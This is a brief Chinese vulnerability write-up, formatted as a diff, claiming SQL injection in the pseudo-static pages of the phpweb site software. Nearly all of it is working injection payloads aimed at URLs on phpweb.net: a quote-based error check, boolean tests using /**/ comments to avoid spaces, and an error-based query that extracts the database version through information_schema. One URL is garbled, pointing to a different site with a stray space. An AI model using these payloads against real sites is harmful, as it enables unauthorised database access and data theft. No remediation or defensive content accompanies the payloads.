@@ -1,0 +1,16 @@
+     phpweb所有的整站程序伪静态页面都存在sql注入
+     
+    主站：http://phpweb.net/
+    加’检测：
+     
+    http://www.phpweb.net/down/html/?772′.html
+     
+    出错
+    存在注入。
+    不能用空格，只能用/*罗
+    http://www.phpweb.net/page/html/?56′/**/and/**/1=1/*.html 正常
+     
+    http://www.2cto.com /page/html/?56′/**/and/**/1=2/*.html 出错.
+    爆数据库版本：
+     
+    http://www.phpweb.net/page/html/?56'/**/and/**/(SELECT/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),(substring((select(version())),1,62)))a/**/from/**/information_schema.tables/**/group/**/by/**/a)b)=1/*.html
